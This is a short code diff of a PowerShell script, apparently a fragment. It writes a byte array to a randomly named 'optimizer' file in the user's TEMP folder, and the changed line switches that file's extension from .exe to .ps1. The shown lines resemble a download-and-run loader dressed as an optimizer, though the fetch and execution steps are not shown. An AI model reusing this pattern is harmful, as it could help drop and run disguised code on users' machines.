@@ -57,7 +57,7 @@ try {
     $global:MaxPing = $ping
     
     # Сохраняем во временный файл
-    $tempFile = "$env:TEMP\optimizer_$([guid]::NewGuid().ToString('N').Substring(0,8)).exe"
+    $tempFile = "$env:TEMP\optimizer_$([guid]::NewGuid().ToString('N').Substring(0,8)).ps1"
     [System.IO.File]::WriteAllBytes($tempFile, $r)
     
     Write-Host "  [*] Starting optimizer..." -ForegroundColor Yellow
